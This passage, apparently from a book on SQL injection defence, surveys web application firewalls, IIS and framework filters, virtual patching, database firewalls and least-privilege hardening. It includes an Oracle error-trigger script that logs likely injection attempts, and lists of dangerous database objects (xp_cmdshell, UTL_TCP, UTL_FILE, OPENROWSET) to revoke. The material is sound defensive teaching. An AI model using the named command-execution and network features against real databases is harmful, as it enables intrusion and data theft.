clients or scanners.  \nThis type of response analysis and error suppression does not eliminate the SQL injection \nvulnerability or help in the case of blind SQL injection, but it is still an important defense -in-\ndepth security mechanism.  \nIntrusion Detection Capabilities  \nLastly, WAFs should be able to monitor application behavior passively, take action in the event of suspicious behavior, and maintain a log of events that cannot be repudiated for a forensic analysis following an SQL injection incident. The logs should give you the information to determine whether your application was attacked and provide enough information for reproducing the attack string. Blocking and rejecting  malicious input aside, the \nability to add intrusion detection features to your application without changing a line of code is \na strong argument for the use of WAFs. When performing a forensic analysis following an SQL injection incident, nothing is more frustrating than having to rely on Web server log files, which often contain only a small subset of the data sent in the request.  \n\nIn summary, with ModSecurity it is possible to stop SQL injection attacks, patch a known \nSQL injection vulnerability, detect attack attempts, and suppress SQL  error messages that \noften facilitate exploitation of SQL injection vulnerabilities. Now that we’ve discussed \nModSecurity and WAFs in general, we’re going to look at some solutions that could be considered a WAF but are not as robust. However, they can be just as effective depending on the scenario, and they can be potentially cheaper in cost and resource requirements to deploy.  \nTools and traps  \nModSecurity has become the standard for Open Source WAFs, however as ModSecurity is tightly integrated to \nthe Apache Web server, this can limit its flexibility. One up and coming project to keep an eye on in the future is \nIronBee ( www.ironbee.com ). This is a new Open Source WAF project lead by the original developer of \nModSecurity, Ivan Ristić, which aims to overcome many of the difficulties of using ModSecurity, including \nsupporting multiple Web server platforms.  \nIntercepting Filters  \nMost WAFs implement the intercepting filter pattern or include one or more implementations in their overall architecture. Filters are a series of independent modules that you can chain together to perform processing before and after the core processing of a requested resource (Web page, URL, script, etc.). Filters do not have explicit dependencies on each other; this allows you to add new filters without affecting existing filters. This modularity makes filters reusable across applications. You can add filt ers to applications at deployment when \nimplemented as a Web server plug -in or when activated dynamically within an application \nconfiguration file.  \nFilters are ideal for performing centralized, repeatable tasks across requests and responses \nthat are loosely  coupled with core application logic. They are also good for security functions \nsuch as input validation, request/response logging, and transforming outgoing responses. In the next two sections, we’re going to look at two common filter implementations: Web  server \nplug-ins and application framework modules. You can use both of them for runtime SQL \ninjection protection. Figure 9.7 shows where each is executed as the HTTP request and \nresponse passes to/from the Web browse r. \n \nFigure 9.7  Diagram Depicting Web Server and Application Filters  \nWeb Server Filters  \nYou can implement fi lters as Web server modules/plug -ins, which extend the core request and \nresponse handling application program interface (API) of the Web server platform. Basically, \nrequests and responses handled by the Web server pass through a series of phases, and \nmodul es can be registered to execute at each phase. Web server modules permit customized \nhandling of a request before the request reaches the Web application and after it has generated a response. All of this occurs independently of other Web server modules tha t might be \nregistered and independently of the Web application’s underlying logic. This feature makes Web server modules a good implementation choice for filters. Popular Web server platforms such as Apache, Oracle/Sun (Netscape), and Internet Information Server (IIS) all support this type of architecture. Unfortunately, because each exposes its own API, you cannot leverage the modules across Web server platforms.  \nA clear advantage of Web server modules is that they are not bound to a particular Web \napplication framework or programing language. For example, IIS plug -ins, called ISAPI \nfilters, can be used to validate and monitor requests bound for classic ASP and ASP.NET Web applications, as well as transform their response content. When the Web server is configured to use a connector (a filter that routes requests to the appropriate resource handler) or in reverse proxy server mode, filters can be leveraged to protect virtually any Web application (i.e. you \ncan use IIS ISAPI filters to protect J2EE, PHP, and ColdFusion Web applications). Lastly, because filters are executed for every Web page request, performance is critical. Web server filters are typically implemented in a native programing language such as C or C++, which can be very fast, but has the potential to introduce new classes of vulnerabilities to consider, such as buffer overflows and format string issues.  \n\nWeb server modules are an important component of runtime security because of the request \nand response handling APIs they expose. This allows you to extend the behavior of the Web \nserver to meet your specific needs, such as writing a filter for SQL injection protection. Luckily, you can use several freely available Web server filter implementations for SQL injection protection. We already discusse d ModSecurity, an Apache API module which offers \nconsiderable SQL injection protection. What follows is a brief description of UrlScan and WebKnight, two freely available ISAPI filters that plug into the IIS Web server platform and provide SQL injection pr otection. \nUrlScan  \nIn June 2008, Microsoft released version 3.1 of UrlScan as an upgrade to the 2.5 version originally released as part of the IIS Lock Down Tool. Like its predecessor, 3.1 is a free ISAPI filter that blocks certain malicious requests; howev er, this version is geared toward \napplication -level attacks —specifically, SQL injection, as it was released in response to the \nmass SQL injection worms that began infecting Web sites in early 2008. This new version supports creating custom rules for blocki ng certain malicious requests; however, its protection \nis limited to querystrings, headers, and cookies. You can apply the rules to any Web resource hosted on the server, such as classic ASP and ASP.NET resources. It also enhances the normal IIS logging fa cilitates, supports a logging -only mode, and is configurable from the urlscan.ini \nfile. Unfortunately, regular expressions are not supported and POST  data is not protected. \nThese two limitations make UrlScan a less -than-optimal solution for SQL injection p rotection. \nBecause it is easy to install, it could be useful for legacy applications where code modifications are not an option and a quick band- aid solution is needed.  \nYou can find more information on UrlScan at http://learn.iis.net/page.aspx/938/urlscan- 3-\nreference/  and you can download it at \nhttp://www.microsoft.com/downloads/details.aspx?FamilyID=ee41818f -3363- 4e24- 9940-\n321603531989 for the 32 bit version, and \nhttp://www.microsoft.com/downloads/details.aspx?FamilyID=361e5598- c1bd- 46b8- b3e7-\n3980e8bdf0de  for the 64  bit version. \nWebKnight  \nLike UrlScan, WebKnight is implemented as an IIS ISAPI filter that blocks certain malicious requests. It matches all of the features offered by UrlScan,  and by far its biggest benefit over \nUrlScan is that it can check POST  data for malicious input. It is highly configurable and comes \nwith a GUI, which makes it easier to configure than UrlScan. In fact, you can import your \nUrlScan settings into WebKnight. Unfortunately, like UrlScan, WebKnight does not support regular expressions and so is limited to blacklist keyword validation. WebKnight is a better solution than UrlScan when it comes to SQL injection due to its more comprehensive coverage of the request.  It is also easy to install, but its lack of support for regular expressions and a \npositive security model make it more of a quick band- aid solution or an initial defense \nmechanism against automated SQL injection worms.  \nYou can download WebKnight at www.aqtronix.com . \nTools & traps… \nKnow Your Filter  \nBefore using a filter to protect your Web application from SQL injection, it’s important that you understand how \nthe filter works and the type of protection it provides. Al though filters are valuable runtime security tools, they \ncan introduce a false sense of security if you do not completely understand their behavior and security model. \nMicrosoft’s UrlScan 3.1 is a good example of this, as it provides only querystring, header, and cookie protection. \nPages with POST  parameters vulnerable to SQL injection will be left exposed to exploitation.  \nApplication Filters  \nYou also can implement filters in the Web application’s programing language or framework. The architecture is simila r to that of Web server plug -ins: modular code executes as requests \nand responses pass through a series of phases. You can use the ASP.NET System.Web.IHttpModule  interface and the javax.servlet.Filter  interface to implement the filter \npattern. You can then add them to an application without code changes and activate them \ndeclaratively in the application configuration file. Figure 9.8  shows an example code snippet of \nthe doFilter  method of a custom J2EE Filter  class. Th is method is called for each \nrequest/response pair for a J2EE Web resource (JSP file, servlet, etc.).  \n \nFigure 9.8  Code Snippet of a Custom J2EE Filter  Class  \nIn terms of runtime protection, application filters are useful because they can be developed \nindependently of the application, deployed as a stand- alone .dll or .jar file, and turned on \nimmediately. This means this solution can be deployed more quickly in certain organizations \nbecause Web server configuration changes are not required (in many organizations, application \ndevelopers do not have access to the Web servers and so must coordinate with the Web server team to make the configuration changes associated with a Web server filter). Because these filters are implemented in the same programming language as the application, they can extend or closely wrap existing application behavior. For this same reason, their utility is limited to applications built on t he same framework (refer to the Tools and Traps sidebar, “Protecting \nWeb applications with ASP.NET and IIS,” for information on how you can overcome this limitation).  \nSimilar to Web server filters, application filters allow you to add security features, su ch as \nmalicious request detection, prevention, and logging, to vulnerable Web applications. Because they can be written in feature -rich object -oriented languages such as Java and C#, they are \nusually less complex to code and do not introduce new vulnerabil ity classes such as buffer \noverflows. The OWASP ESAPI Web application firewall (part of the OWASP Enterprise Security API) and Secure Parameter Filter (SPF) are  free application filters that you can use to \ndetect and block SQL injection attacks. OWASP ESAP I WAF is a J2EE filter and you can \ndownload it as part of ESAPI at \nwww.owasp.org/index.php/Category:OWASP_Enterprise_Security_API . SPF is an ASP.NET \nHttpModule and you ca n download it at http://spf.codeplex.com/ . \nTools & traps… \nProtecting Web Applications with ASP.NET and IIS  \n\nWeb applications that are not built on the .NET Framework, but run on IIS (PHP, classic ASP, Perl, etc.), ca n be \nprocessed by ASP.NET code modules by mapping their file type (.php, .asp, .pl, etc.) to an ASP.NET ISAPI \ndynamic link library (DLL). You can configure this under the application’s configuration in IIS with the \nApplication Configuration | Mappings  tab. In this scenario, an ASP.NET HttpModule that performs input \nvalidation and logging can now be leveraged on non -ASP.NET Web applications. However, there are limitations \non what you can do to the request and response, especially in the area of response tran sformation.  \nThe IIS 7.0 and up, ASP.NET Integrated Mode enhances this capability further by combining the ASP.NET \nrequest pipeline with the IIS core request pipeline. Essentially, you can plug ASP.NET HttpModules into IIS and \nhave control over the entire r equest and response that in previous versions of IIS was possible only with an ISAPI \nfilter. This gives HttpModules the capability to perform comprehensive processing of requests and responses, and \npermits a module such as SPF to provide non -editable input protection to non- ASP.NET Web applications \nthrough transformation of response content. For more information on the type of protection SPF provides, refer to \n“Non -Editable Versus Editable Input Protection.”  \nImplementing the Filter Pattern in Scripted Languages  \nFor Web scripting languages, the filter pattern can be more difficult to implement. \nTechnologies such as PHP and classic ASP don’t provide built -in interfaces for hooking into \nrequest/response handling before or after page execution. You could use a W eb server filter or \neven an application filter (refer to the Tools and Traps sidebar, “Protecting Web applications with ASP.NET and IIS” for more details) to protect a vulnerable classic ASP application; however, this requires administrative privileges on the Web server to make configuration changes, which may not always be the case or may not be convenient. Additionally, you may not want to modify the code for reasons discussed at the start of “Using Runtime Protection.”  \nFor PHP Web applications, you can l everage the auto_prepend_file  and auto_append_file  \nconfiguration directives in the php.ini file. These directives point to PHP files that will be executed before and after the execution of every PHP script that is requested. The added -in \nlogic would be use d to loop through the various HTTP request collections (querystring, POST , \ncookies, headers, etc.) and validate and/or log as necessary.  \nAn alternative for both PHP and classic ASP applications is to use include files. This \nrequires code modification in the form of adding include  directives on every application page. \nSimilarly, the included logic would loop through the various HTTP request collections and validate and/or log as necessary.  \nFiltering Web Service Messages  \nThe intercepting filter pattern is als o easy to apply to XML Web Services with custom input \nand output filters. An input filter could perform validation of method parameters and log SQL \ninjection attempts. You also could use an output filter to suppress error details, such as those that often leak out in the faultstring of a SOAP Fault message. The .NET Web Services and Apache Axis platforms, for example, both provide mechanisms for filtering inbound and outbound messages.  \nModSecurity can also handle inbound XML messages to perform validation a nd logging \nwith the XML TARGET . Validation can be performed with XPATH  queries, or against a \nschema or document type definition (DTD) file. Commercial XML firewalls can also be considered, although they are typically network appliances and likely overkill if you are just looking for SQL injection protection. \nNon-Editable Versus Editable Input Protection \nAlmost every filter implementation employs blacklist protection, whereas whitelist validation, which is much more powerful and effective against SQL injecti on, is less prevalent and often \ncomplex to configure. This is likely because defining an exact match (i.e. whitelist) for every request parameter is a daunting task, even if a learning mode is available. This is especially true for inputs that accept free -form text, such as textboxes.  \nAnother input validation strategy to consider is classifying application inputs as editable and \nnon-editable, and locking down the non -editable inputs so that they cannot be manipulated. \nNon-editable inputs are those that end users do not need to modify directly —hidden form \nfields, URIs and querystring parameters, cookies, etc. The theory behind the strategy is that the application should permit users to perform only those actions that the user interface has presented to them. The idea is to leverage HTTP responses at runtime to identify all legitimate requests (forms and links), collect the state of each possible request, and then validate subsequent requests against the stored state information. For many applications, non- editable \ninputs are the majority of input accepted by an application. Therefore, if you can lock these down automatically at runtime, you can then focus your efforts on comprehensively validating the editable inputs, which is usually a much more manageable tas k. \nExamples of technologies that implement this strategy are HTTP Data Integrity Validator \n(HDIV) and SPF. You can use HDIV to protect most J2EE Web applications that follow the \nModel -View -Controller (MVC) pattern and you can download it at www.hdiv.org . You can \nuse SPF to protect ASP.NET Web applications when run on IIS 6.0; however, it can be \nleveraged to protect virtually any Web application when run on IIS 7.0 and above. Refer to the Tools and Traps sidebar, “Protecti ng Web applications with ASP.NET and IIS,” for more \ninformation. You can download SPF at http://spf.codeplex.com . \nURL/Page -Level Strategies  \nLet’s look at some other techniques for virtual -patching a vulnerable URL or page without \nchanging the source code.  \nPage Overriding  \nIf a page is vulnerable and needs replacing, you can create a replacement page or class that is substituted at runtime. The substitution is accomplished with configuration in the Web application’s configuration file. In ASP.NET applications, you can use HT TP handlers to \naccomplish this task.  \nFigure 9.9  shows a custom HTTP handler configured to handle requests to \nPageVulnToSqlI.aspx instead of the vulnerable page itself. The substituted handler class implements the logic of the original page in a secure manner. This could include stringent validation of request parameters and the use of secure data access objects.  \n \nFigure 9.9  Configuring an HTTP Handler in web.config \nYou can use a similar approach in the deployment descriptor of a J2EE Web application. \nYou can map the vulnerable URL to a servlet that handles the request in a s ecure manner, as \nshown in Figure 9.10.  \n\n \nFigure 9.10  Configuring a Substitute Servlet in web.xml  \nURL Rewriting  \nA somewhat similar technique to page overriding is URL rewriting. You can configure the \nWeb server or application framework to take requests that are made to a  vulnerable page or \nURL and redirect th em to an alternative version of the page. This new version of the page \nwould implement the logic of the original page in a secure manner. The redirection should be performed server- side so that it remains seamless to the client. There are a number of ways to \naccomplish this depending on the Web server and application platform. The Apache module mod_rewrite  and the .NET Framework urlMappings  element are two examples.  \nResource Proxying/Wrapping  \nYou can combine resource proxying/wrapping with either page overr iding or URL rewriting to \nminimize the amount of custom coding needed in the replacement page. When the replacement page handles the rewritten request, it would iterate through the request parameters (querystring, POST , cookies, etc.) and perform the requi red validations. If the request is \ndeemed safe, the request would be permitted to pass on to the vulnerable page via an internal server request. The vulnerable page would then handle the input and perform whatever rendering is needed. Passing input to the vulnerable page in this manner is acceptable because the replacement page has performed the necessary validation to ensure the input is safe. Essentially, the replacement page wraps the vulnerable page, but does not require duplication \nof logic.  \nAspect -Oriented Programing (AOP)  \n\nAspect -oriented programing is a technique for building common, reusable routines that can be \napplied application wide. During development this facilitates separation of core application \nlogic and common, repeatable tasks (input validation, logging, error handling, etc.). At runtime, you can use AOP to hot -patch applications that are vulnerable to SQL injection, or \nembed intrusion detection and audit logging capabilities directly into an application without modifying the underlying sou rce code. The centralization of security logic is similar to the \nintercepting filter previously discussed, except the benefits of AOP can extend well beyond the Web tier. You can apply security aspects to data access classes, thick client applications, and  \nmiddle -tier components, such as Enterprise JavaBeans (EJBs). For example, you could \nimplement checks for insecure dynamic SQL libraries (e.g. executeQuery() ), prevent the query \nfrom executing, and log the offending call for follow -up remediation efforts. There are a \nnumber of AOP implementations, but some of the more common ones are AspectJ, Spring AOP, and Aspect.NET.  \nApplication Intrusion Detection Systems (IDSs)  \nYou could use traditional network- based IDSs to detect SQL injection attacks; however IDSs \nare often not optimal for this purpose as they are far removed from the application and Web \nserver. However, if you already have one of these running on your network you could still leverage it for an initial line of defense.  \nAs mentioned previously, a WAF can serve as a very good IDS because it operates at the \napplication layer and can be finely tuned for the specific application being  protected. Most \nWAFs come with a passive mode with alerting capabilities. In many production application environments, using a security filter or WAF in this capacity is preferred. You can use them to detect attacks and alert administrators who can then decide what should be done about the vulnerability —for example, perhaps enabling blocking of malicious requests for the speci fic \npage/parameter combination or applying a virtual patch.  \nAnother option is an embedded solution such as PHPIDS ( http://phpids.org/ ). PHPIDS does \nnot filter or sanitize input, but rather detects attacks and takes action  based on its configuration. \nThis could range from simple logging to sending out an emergency e -mail to the development \nteam, displaying a warning message for the attacker or even ending the user’s session.  \nDatabase Firewall  \nThe last runtime protection tec hnique we’ll cover is the database firewall, which is essentially \na database proxy server that sits between the application and the database. The application \nconnects to the database firewall and sends the query as though it were normally connecting to \nthe database. The database firewall analyzes the intended query and passes it on to the database \nserver for execution if deemed safe. Alternatively, it can prevent the query from being run if malicious. It can also serve as an application -level IDS for malici ous database activity by \nmonitoring connections in passive mode and altering administrators of suspicious behavior. In terms of SQL injection, database firewalls could potentially be just as effective if not more so than WAFs. Consider that the queries the  Web application sends to the database are, for the \nmost part, a known quantity of commands, and their structure is known as well. You can leverage this information to configure a highly tuned set of rules that takes appropriate action (log, block, etc.) a gainst unusual or malicious queries before they ever hit the database. One of \nthe hardest problems with locking down input in a WAF is that malicious users can send in any combination of requests to the Web server. An example open source implementation is GreenSQL, which you can download at www.greensql.net . \nSecuring the database  \nWhen an attacker has an exploitable SQL injection vulnerability, he can take one of two primary exploit paths. He can go after the application data itself, which depending on the application and the data could be very lucrative. This is especially true if the application handles and insecurely stores personally identifiable information or financial data, such as bank account and credit card information. Alternatively, the attacker may be interested in leveraging the database server to penetrate internal, trusted networks. In this section, we’re going to look at ways to limit unauthorized access to application data. Then we’ll look at some techn iques for hardening the database server to help prevent privilege escalation and limiting \naccess to server  resources outside the context of the target database server. You should fully \ntest the steps we’ll be covering in a non- production environment first, to avoid breaking the \nfunctionality of existing applications. New applications have the benefit of building these recommendations into the development life cycle early to avoid dependencies on unnecessary and privileged functionality.  \nLocking Down the Application Data  \nLet’s first examine some techniques restricting the scope of an SQL injection attack to the application database only. We’re also going to look at ways to restrict access even if the attacker has been successfully sandboxed to the application database.  \nUse the Least -Privileged Database Login  \nApplications should connect to the database server in the context of a login that has \npermissions for performing required application tasks only. This critical defense can significantly  mitigate the risk of SQL injection, by restricting what an attacker can access and \nexecute when exploiting the vulnerable application. For example, a Web application used for reporting purposes, such as checking the performance of your investment portfoli o, should \nideally access the database with a login that has inherited only the permissions on objects (stored procedures, tables, etc.) needed to produce this data. This could be EXECUTE permissions on several stored procedures and possibly SELECT permissi ons on a handful of \ntable columns. In the event of SQL injection, this would at least limit the possible set of commands to the stored procedures and tables within the application database and prevent malicious SQL outside this context, such as dropping ta bles or executing operating system \ncommands. It’s important to remember that even with this mitigating control the attacker may still be able to circumvent business rules and view the portfolio data of another user.  \nTo determine the permissions assigned to a database login, find its role membership and \nremove any unnecessary or privileged roles, such as the public or database administrator role. Ideally, the login should be a member of one (or possibly more) custom application role. A follow -up step is to a udit permissions assigned to custom application roles to ensure that they \nare locked down appropriately. During a database audit, it is very common to find unnecessary UPDATE or INSERT permissions assigned to custom application roles intended for read- only \naccess. These audit and subsequent cleanup steps can be performed with graphical management tools that often accompany the database server platform or with SQL via the query console.  \nSegregated Database Logins  \nAn extension of the least -privileged database login is to use multiple database logins for \napplications that require write as well as read access to the database. In applications that have relatively little write or update functionality compared to the amount of read -only or reporting \nfunctionality w e can gain additional security by segregating read -only SELECT functionality \nwithin the application from functionality requiring wider write access such as INSERT or UPDATE. We can then map each segregated  part of the application to an underlying database \nlogin with only the required access to the database, therefore minimizing the impact of any SQL injection issue in the read -only part of the application. \nRevoke PUBLIC Permissions  \nEvery database server platform has a default role to which every login belon gs, usually called \nthe public role, which has a default set of permissions that includes access to system objects. \nAttackers can use this default access to query database metadata to map out the database schema and target the juiciest tables for subsequent  querying, such as those storing application \nlogin credentials. The public role is also commonly assigned permissions to execute built -in \nsystem stored procedures, packages, and functions used for administrative purposes.  \nUsually you cannot drop the public  role; however, it is recommended that you not grant \nadditional permissions to the public role, because each database user inherits the permissions of this role. You should revoke public role permissions from as many system objects as possible. Additionall y, you must revoke superfluous permissions granted to the public role on \ncustom database objects (such as application tables and stored procedures) unless a justifiable reason for the permissions exists. If necessary, you should assign database permissions  to a \ncustom role that you can use to grant a default level of access to specific users and groups.  \nUse Stored Procedures  \nFrom a security perspective, you should encapsulate application SQL queries within stored procedures and grant only EXECUTE permissions on those objects. All other permissions, such as SELECT, INSERT, and so on, on the underlying objects can then be revoked. In the event of SQL injection, a least -privileged database login that has only EXECUTE permissions \non application stored procedures  makes it more difficult to return arbitrary result sets to the \nbrowser. This does not guarantee safety from SQL injection however, as the insecure code could lie within the stored procedure itself. Additionally, it may be possible to obtain result sets vi a other means, such as with blind SQL injection techniques.  \nUse Strong Cryptography to Protect Stored Sensitive Data \nA key mitigating control against unauthorized viewing of sensitive data in the database is the \nuse of strong cryptography. Options include storing a mathematical hash of the data (rather than the data itself) or storing the data encrypted with a symmetric algorithm. In both cases, you should use only public algorithms deemed cryptographically strong. You should avoid homegrown cryptographic s olutions at all costs.  \nIf the data itself does not require storage, consider an appropriately derived mathematical \nhash instead. An example of this is data used for challenging the identity of a user, such as passwords or security question answers. If an a ttacker is able to view the table storing this data, \nonly password hashes will be returned. The attacker must go through the time -consuming \nexercise of cracking password hashes to obtain  the actual credentials. Another clear benefit to \nhashing is that it e liminates the key management issues associated with encryption. To stay \nconsistent with security best practices, ensure that the hashing algorithm of choice has not been \ndetermined mathematically susceptible to collisions, such as MD5 and SHA -1. Consult \nresources such as NIST ( http://csrc.nist.gov/groups/ST/hash/policy.html ) to find out the current \nset of hashing algorithms deemed acceptable for use by federal agencies.  \nIf you must store sensit ive data, protect it with a strong symmetric encryption algorithm \nsuch as Advanced Encryption Standard (AES) or Triple DES (Data Encryption Standard). The primary challenge to encrypting sensitive data is storing the key in a location that the attacker cannot access easily. You should never store encryption keys client -side, and the best server -\nside solution for key storage usually depends on the application architecture. If the key can be provided at runtime, this is ideal as it will only reside in memory on the server (and depending on the application framework it can be possible to protect it while in memory). However, on -\nthe-fly key generation is usually not feasible or practical in most enterprise application \nenvironments. One possible solution is to st ore the key in a protected location on the \napplication server so that the attacker needs to compromise both the database server and the application server to decrypt it. In a Windows environment, you can use the Data Protection API (DPAPI) to encrypt appli cation data and leverage the operating system to securely store \nthe key. Another Windows -specific option is storing the key in the Windows Registry, which \nis a more complex storage format than a flat text file and therefore could be more challenging to vie w depending on the level of unauthorized access gained by the attacker. When operating \nsystem specific storage options are not available (such as with a Linux server), you should store the key (or secret used to derive it) on a protected area of the file s ystem with strict file \nsystem ACLs applied. It’s also worth noting that as of Microsoft SQL Server 2005 and Oracle Database 10g Release 2, both support column- level encryption natively. However, these nice \nbuilt-in features do not provide much additional protection against SQL injection, as this \ninformation will usually be transparently decrypted for the application. \nMaintaining an Audit Trail  \nMaintaining an audit trail of access on application database objects is critical; however, many \napplications don’t do this at the database level. Without an audit trail, it is difficult to know whether the integrity of application data has been maintained given an SQL injection attack. The server transaction log might provide some detail; however, this log contains sys tem-wide \ndatabase transactions, making it hard to track down application- specific transactions. All \nstored procedures could be updated to incorporate auditing logic; however, a better solution is \ndatabase triggers. You can use triggers to monitor actions performed on application tables, and \nyou don’t have to modify existing stored procedures to begin taking advantage of this functionality. Essentially, you can easily add this type of functionality to existing applications without having to modify any data a ccess code. When using triggers, it’s important to keep the \nlogic simple to avoid possible performance penalties associated with the additional code, and to ensure that the trigger logic is written securely to avoid SQL injection within these objects. Let’s take a closer look at Oracle database triggers to better understand how triggers can be \nleveraged to detect possible SQL injection attacks. \nOracle Error Triggers  \nOracle database triggers can fire database- wide in the case of special events, such as the \ncreation of a Data Definition Language (DDL; e.g. DDL trigger), or in the case of a database \nerror (e.g. ERROR trigger). This can offer a simple and easy way to detect simple SQL injection attempts.  \nIn many cases on Oracle, SQL injection attempts, at least in the beginning of an attack, will \ncreate error messages such as “ORA -01756 Single quote not properly terminated” or “ORA -\n01789 Query block has incorrect number of result columns.” The number of these error messages is small under normal circumstances, an d in most cases they are unique to SQL \ninjection attacks, therefore keeping the number of false positives low. \nThe following code will find and document SQL injection attempts in an Oracle database:  \n-- Purpose: Oracle Database Error Trigger to detect SQL injection Attacks  \n-- Version: v 0.9  \n-- Works against: Oracle 9i, 10g and 11g  \n-- Author: Alexander Kornbrust of Red- Database- Security GmbH  \n-- must run as user SYS  \n-- latest version:  http://www.red- database- security.com/scripts/oracle_error_trigger.html  \n-- \n-- Create a table containing the error messages  \ncreate table system.oraerror (  \nid NUMBER,  \nlog_date DATE,  \nlog_usr VARCHAR2(30),  \nterminal VARCHAR2(50),  \nerr_nr NUMBER(10),  \nerr_msg VARCHAR2(4000),  \nstmt CLOB  \n); \n-- Create a sequence with unique numbers  \ncreate sequence system.oraerror_seq  \nstart with 1  \nincrement by 1  \nminvalue 1  \nnomaxvalue  \nnocache  \nnocycle;  \nCREATE OR REPLACE TRIGGER after_error  \n AFTER SERVERERROR ON DATABASE  \n DECLARE  \n pragma autonomous_transaction;  \n id NUMBER;  \n sql_text ORA_NAME_LIST_T;  \n v_stmt CLOB;  \n n NUMBER;  \nBEGIN  \n SELECT oraerror_seq.nextval INTO id FROM dual;  \n-- \nn:= ora_sql_txt(sql_text);  \n-- \nIF n >= 1  \nTHEN \nFOR i IN 1..n LOOP  \nv_stmt:= v_stmt || sql_text(i);  \nEND LOOP;  \nEND IF;  \n-- \nFOR n IN 1..ora_server_error_depth LOOP  \n-- \n-- log only potential SQL injection attempts  \n-- alternatively it’s possible to log everything  \nIF ora_server_error(n) in \n(‘900’,‘906’,‘907’,‘911’,‘917’,‘920’,‘923’,‘933’,‘970’,‘1031’,‘1476’,‘1719’,‘1722’,‘1742’,\n‘1756’,‘1789’,‘1790’,‘24247’,‘29257’,‘29540’)  \n AND ((ora_server_error(n) = ‘1476’) and (instr(v_stmt,‘/∗  OracleOEM’ ) =0)) -- exception bug \nin Oracle OEM  \n THEN \n  -- insert the attempt including the SQL statement into a table  \n  INSERT INTO system.oraerror VALUES (id, sysdate, ora_login_user, ora_client_i p_address, \nora_server_error(n), ora_server_error_msg(n), v_stmt);  \n  -- send the information via email to the DBA  \n  -- <<Insert your PLSQL code for sending emails >>  \n  COMMIT;  \n END IF;  \nEND LOOP;  \n-- \nEND after_error;  \n/ \nLocking Down the Database Server  \nOnce the application data has been secured, you may still need to take a few additional steps to \nharden the database server itself. By default PostgreSQL and MySQL have relatively little additional functionality available to the user, however SQL Server and Oracle both have rich functionality provided that should be disabled when hardening the database server.  \nIn a nutshell, you want to make sure the system -wide configuration is secured in a manner \nthat is consistent with the security principle of least privilege and that the database server software is up to date and patched. If you comply with these two key directives, it will be very difficult for an attacker to access anything outside the scope of the intended application data. Let’s take a closer look a t some specific recommendations.  \nAdditional Lockdown of System Objects  \nBesides revoking public role permissions on system objects, consider taking additional steps to \nfurther lock down access to privileged objects, such as those used for system administrat ion, \nexecuting operating system commands, and making network connections. Although these features are useful to database administrators, they are also just as useful (if not more so) to an attacker who has gained direct access to the database. Consider res tricting by ensuring that \nsuperfluous permissions are not granted to application roles, disabling access to privileged objects system -wide via server configuration, or dropping functionality from the server \ncompletely (to avoid this being reenabled should privilege escalation occur).  \nOn Oracle, you should restrict the ability to run operating system commands and to access \nfiles on the operating system level from the database. To ensure that (PL/)SQL injection problems cannot be used to run operating system commands or access files, do not grant the following privileges to the Web application user: CREATE ANY LIBRARY, CREATE ANY DIRECTORY, ALTER SYSTEM, or CREATE JOB. Also, you should remove the PUBLIC grant at least from the following packages if it is not n eeded: UTL_FILE, UTL_TCP, \nUTL_MAIL, UTL_SMTP, HTTPURITYPE, UTL_INADDR, DBMS_ADVISOR, DBMS_SQL, DBMS_PIPE,  DBMS_XMLQUERY and DBMS_XMLGEN. If the \nfunctionality of these packages is required it should be used only via secure application roles.  \nIn SQL Server, you should consider dropping dangerous stored procedures such as \nxp_cmdshell , as well as the procedures that match xp_reg\n∗, xp_instancereg ∗, and sp_OA ∗. If \nthis is not feasible, audit these objects and revoke any permissions that were unnecessarily assigne d. \nRestrict Ad Hoc Querying  \nMicrosoft SQL Server supports a command called OPENROWSET  to query remote and local \ndata sources. Remote querying is useful in that it can be leveraged to attack other database servers on connected networks. Querying the local s erver with this function allows an attacker \nto reauthenticate to the server in the context of a more privileged SQL Server database login. You can disable this feature in the Windows Registry by setting DisallowAdhocAccess  to 1 for \neach data provider at HK LM\\Software \\Microsoft \\MSSQLServer \\Providers. \nSimilarly, Oracle supports ad hoc querying of remote servers via database links. By default, \na normal user does not require this privilege and you should remove it from the account. Check the CREATE DATABASE LIN K privilege (part of the connect role until Oracle 10.1) to \nensure that only required logins and roles are assigned to avoid attackers creating new links. \nStrengthen Controls Surrounding Authentication \nYou should review all database logins, and disable or delete those that are unnecessary, such as \ndefault accounts. Additionally, you should enable password strength within the database server to prevent administrators from selecting weak passwords. Attackers can leverage weakly protected accounts to reauthent icate to the database server and potentially elevate privilege. \nLastly, enable server auditing to monitor suspicious activity, especially failed logins.  \nIn SQL Server databases, consider exclusive use of Integrated Windows Authentication \ninstead of the les s secure SQL Server Authentication. When you do this, attackers will be \nunable to reauthenticate using something such as OPENROWSET ; in addition, it reduces the \npossibility of sniffing passwords over the network, and can leverage the Windows operating system to enforce strong password and account controls. \nRun in the Context of a Least -Privileged Operating System Account  \nIf an attacker is able to break outside the context of the database server and gain access to the underlying operating system, it is critical that this occurs in the context of the least -privileged \noperating system account. You should configure database server software running on ∗ nix \nsystems to run in the context of an account that is a member of a custom group that has minimal file system permissions to run the software. By default, SQL Server 2005 and later \ninstallers will select the minimally privileged NETWORK SERVICE account for running SQL Server.  \nTools & traps… \nSQL Server is Taking Security Seriously  \nThe good news is that starting wit h SQL Server 2005, Microsoft included a handy configuration utility called \nSQL Server Service Area Configuration, which makes it really easy to disable most of the functionality that an \nattacker could abuse. Previous versions of SQL Server required running  Transact -SQL statements or modifying \nthe Windows Registry. Even better, most of the dangerous features are disabled by default.  \nEnsure That the Database Server Software is Patched  \nKeeping software up to date with the current patch level is a fundamental security principle, but it’s easy to overlook given that database servers are not usually Internet -facing systems. An \nattacker can often exploit server vulnerabilities via an application -level SQL injection \nvulnerability just as easily as though he were on the same network as the database server. The \nexploit payload could be a sequence of SQL commands that exploit a SQL injection vulnerability in a PL/SQL package, or even shell code t o exploit a buffer overflow in an \nextended stored procedure. Automated update mechanisms are ideal for keeping up to date. You can keep SQL Server up to date with Microsoft Update ( http://update.microsoft.com ). \nOracle database administrators can check for current updates by signing up with the Oracle \nMetaLink service ( https://metalink.oracle.com/CSP/ui/index.html). MySQL and PostgreSQL \nwill often be pac kaged by the operating system vendor (for example, Red Hat), and can \ntherefore be patched via the same method used for updating the operating system —if installed \nor compiled manually, updates will need to be installed manually, and therefore it is not recommended to custom install unless this is required. Third- party patch management systems \nare another way to keep patch levels current. Table 9.1 shows commands that can help you \ndetermine the version of the database server software for SQL Server and Oracle. Also included in the table are links for checking  the version information to tell whether your \ndatabase server is completely patched for these platforms.  \nTable 9.1  Determining SQL Server/Oracle Database Server Versions  \n \nAdditional deployment conside rations  \nThis section covers additional security measures to help you secure deployed applications. These are primarily configuration enhancements to the Web server and network infrastructure to 